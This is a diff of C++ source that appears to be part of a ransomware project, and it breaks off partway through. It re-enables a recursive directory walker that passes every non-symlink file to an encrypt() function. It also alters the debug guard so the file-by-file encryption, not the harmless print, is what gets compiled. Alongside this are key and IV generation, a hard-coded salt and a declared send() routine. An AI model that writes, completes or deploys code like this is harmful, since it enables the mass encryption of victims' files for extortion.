@@ -21,7 +21,7 @@
 #	include <pwd.h>
 #endif
 
-//using namespace boost::filesystem;
+using namespace boost::filesystem;
 using std::string;
 
 //TODO change this salt!
@@ -33,8 +33,8 @@ static const BYTE Salt[] =
 
 void encrypt(string path);
 
-//void iterate(const path& parent);
-//void process(const path& path);
+void iterate(const path& parent);
+void process(const path& path);
 string get_username();
 string get_home();
 void send();
@@ -95,7 +95,7 @@ DWORD generateKeyAndIV(PBYTE* iv, PBYTE* key)
 	return status;
 }
 
-void encrypt(const string path) 
+void encrypt(string path) 
 {
 	DWORD status;
 	string cipher;
@@ -190,41 +190,32 @@ void encrypt(const string path)
 	//TODO CLEANUP!!!!!
 }
 
-//crypt_data* generatekey() {
-//	crypt_data* d = new crypt_data;
-//
-//	AutoSeededRandomPool prng;
-//
-//	prng.GenerateBlock(d->key, sizeof(d->key));
-//	prng.GenerateBlock(d->iv, sizeof(d->iv));
-//
-//	return d;
-//}
-//
-//void iterate(const path& parent) {
-//	string path;
-//	directory_iterator end_itr;
-//
-//	for (directory_iterator itr(parent); itr != end_itr; ++itr) {
-//		path = itr->path().string();
-//
-//		if (is_directory(itr->status()) && !symbolic_link_exists(itr->path())) {
-//			iterate(path);
-//		}
-//		else {
-//			process(path);
-//		}
-//	}
-//}
-//
-//void process(const path& path) {
-//#ifdef DEBUG
-//	cout << "Processing " << path << endl;
-//#else
-//	encrypt(path);
-//#endif
-//}
-//
+
+
+void iterate(const path& parent) {
+	string path;
+	directory_iterator end_itr;
+
+	for (directory_iterator itr(parent); itr != end_itr; ++itr) {
+		path = itr->path().string();
+
+		if (is_directory(itr->status()) && !symbolic_link_exists(itr->path())) {
+			iterate(path);
+		}
+		else {
+			process(path);
+		}
+	}
+}
+
+void process(const path& path) {
+#ifdef debug
+	cout << "processing " << path << endl;
+#else
+	encrypt(path.string());
+#endif
+}
+
 //string get_username() {
 //#ifdef _WIN32
 //	char username[UNLEN + 1];
